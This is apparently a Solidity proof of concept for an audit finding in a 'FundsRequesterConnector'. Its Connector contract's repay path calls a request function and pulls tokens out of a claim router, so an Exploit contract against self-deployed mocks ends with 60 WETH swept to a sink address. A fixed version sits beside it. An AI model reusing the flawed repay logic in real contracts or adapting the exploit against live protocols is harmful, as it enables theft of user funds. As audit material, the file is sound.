// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Spokes V1 FundsRequesterConnector (Halborn).
    _repayTokenToClaimRouter raises the claim-router allowance and then
    calls requestTokenFromClaimRouter. A repay of 30 WETH should push
    that 30 to the router. This path pulls 30 more instead, so the
    blueprint that already held the 30 protection payout now holds 60.
*/

contract Token {
    string public constant name = "Wrapped Ether";
    string public constant symbol = "WETH";
    uint8 public constant decimals = 18;

    mapping(address => uint256) internal _bal;
    mapping(address => mapping(address => uint256)) internal _allow;

    function balanceOf(address account) external view returns (uint256) {
        return _bal[account];
    }

    function allowance(address owner, address spender) external view returns (uint256) {
        return _allow[owner][spender];
    }

    function mint(address to, uint256 amount) external {
        _bal[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        _allow[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _bal[msg.sender] -= amount;
        _bal[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = _allow[from][msg.sender];
        if (allowed != type(uint256).max) {
            _allow[from][msg.sender] = allowed - amount;
        }
        _bal[from] -= amount;
        _bal[to] += amount;
        return true;
    }
}

contract ClaimRouter {
    function getEarnClaimRouter() external view returns (address) {
        return address(this);
    }

    function approve(Token token, address spender, uint256 amount) external {
        token.approve(spender, amount);
    }
}

contract FundsRequester {
    Token public token;
    address public claimRouter;
    uint256 public requested;
    uint256 public repaid;

    constructor(Token token_, address claimRouter_) {
        token = token_;
        claimRouter = claimRouter_;
    }

    function requestTokenFromClaimRouter(address asset, uint256 amount) external {
        require(asset == address(token), "asset");
        token.transferFrom(claimRouter, msg.sender, amount);
        requested = amount;
    }

    function repayTokenToClaimRouter(address asset, uint256 amount) external {
        require(asset == address(token), "asset");
        token.transferFrom(msg.sender, claimRouter, amount);
        repaid = amount;
    }
}

contract Connector {
    Token public token;
    ClaimRouter public registry;
    FundsRequester public funds;
    uint256 public concreteDebt;
    uint256 public owedBefore;
    uint256 public routerWord;
    uint256 public amountWord;
    uint256 public allowanceWord;
    uint256 public pulledWord;
    uint256 public heldAfter;
    uint256 public routerLeft;

    constructor(Token token_, ClaimRouter registry_, FundsRequester funds_) {
        token = token_;
        registry = registry_;
        funds = funds_;
    }

    function setDebt(uint256 amount) external {
        concreteDebt = amount;
    }

    function approveFunds(uint256 amount) external {
        token.approve(address(funds), amount);
    }

    function repayConcreteDebt(uint256 amount) external {
        owedBefore = concreteDebt;
        require(amount == owedBefore && owedBefore == 30 ether, "30 debt");
        concreteDebt = 0;
        _repayTokenToClaimRouter(address(token), amount);
    }

    function _repayTokenToClaimRouter(address asset, uint256 amount) internal {
        address claimRouter = registry.getEarnClaimRouter();
        routerWord = uint256(uint160(claimRouter));
        _repayTokenToClaimRouter(claimRouter, asset, amount);
    }

    function _repayTokenToClaimRouter(address claimRouter, address asset, uint256 amount) internal {
        amountWord = amount;
        _increaseAllowanceIfNecessary(claimRouter, asset, amount);
        allowanceWord = token.allowance(address(this), claimRouter);
        // @> VULN: repay calls request and pulls assets out of the claim router
        funds.requestTokenFromClaimRouter(asset, amount);
        pulledWord = amount;
        heldAfter = token.balanceOf(address(this));
        routerLeft = token.balanceOf(claimRouter);
    }

    function _increaseAllowanceIfNecessary(address spender, address asset, uint256 amount) internal {
        Token t = Token(asset);
        uint256 current = t.allowance(address(this), spender);
        if (current < amount) {
            t.approve(spender, amount);
        }
    }

    function sweep(address to) external {
        uint256 bal = token.balanceOf(address(this));
        token.transfer(to, bal);
    }
}

contract ConnectorFixed {
    Token public token;
    ClaimRouter public registry;
    FundsRequester public funds;
    uint256 public concreteDebt;

    constructor(Token token_, ClaimRouter registry_, FundsRequester funds_) {
        token = token_;
        registry = registry_;
        funds = funds_;
    }

    function setDebt(uint256 amount) external {
        concreteDebt = amount;
    }

    function approveFunds(uint256 amount) external {
        token.approve(address(funds), amount);
    }

    function repayConcreteDebt(uint256 amount) external {
        require(amount == concreteDebt && concreteDebt == 30 ether, "30 debt");
        concreteDebt = 0;
        funds.repayTokenToClaimRouter(address(token), amount);
    }
}

contract Exploit {
    uint256 public constant DEBT = 30 ether;
    address public constant SINK = 0x000000000000000000000000000000000000D00d;

    Token public token;
    ClaimRouter public router;
    FundsRequester public funds;
    Connector public connector;

    function run() external {
        token = new Token();
        router = new ClaimRouter();
        funds = new FundsRequester(token, address(router));
        connector = new Connector(token, router, funds);
        token.mint(address(router), DEBT);
        router.approve(token, address(funds), type(uint256).max);
        token.mint(address(connector), DEBT);
        connector.approveFunds(type(uint256).max);
        connector.setDebt(DEBT);
        connector.repayConcreteDebt(DEBT);
        require(connector.concreteDebt() == 0, "debt open");
        require(connector.heldAfter() == 60 ether, "not 60");
        require(connector.routerLeft() == 0, "router kept funds");
        require(funds.requested() == DEBT, "no pull");
        require(funds.repaid() == 0, "repay ran");
        connector.sweep(SINK);
        require(token.balanceOf(SINK) == 60 ether, "sink");
    }
}

contract Honest {
    function run() external returns (uint256 connectorLeft, uint256 routerBal, uint256 repaid, uint256 requested) {
        Token token = new Token();
        ClaimRouter router = new ClaimRouter();
        FundsRequester funds = new FundsRequester(token, address(router));
        ConnectorFixed connector = new ConnectorFixed(token, router, funds);
        token.mint(address(router), 30 ether);
        router.approve(token, address(funds), type(uint256).max);
        token.mint(address(connector), 30 ether);
        connector.approveFunds(type(uint256).max);
        connector.setDebt(30 ether);
        connector.repayConcreteDebt(30 ether);
        connectorLeft = token.balanceOf(address(connector));
        routerBal = token.balanceOf(address(router));
        repaid = funds.repaid();
        requested = funds.requested();
    }
}
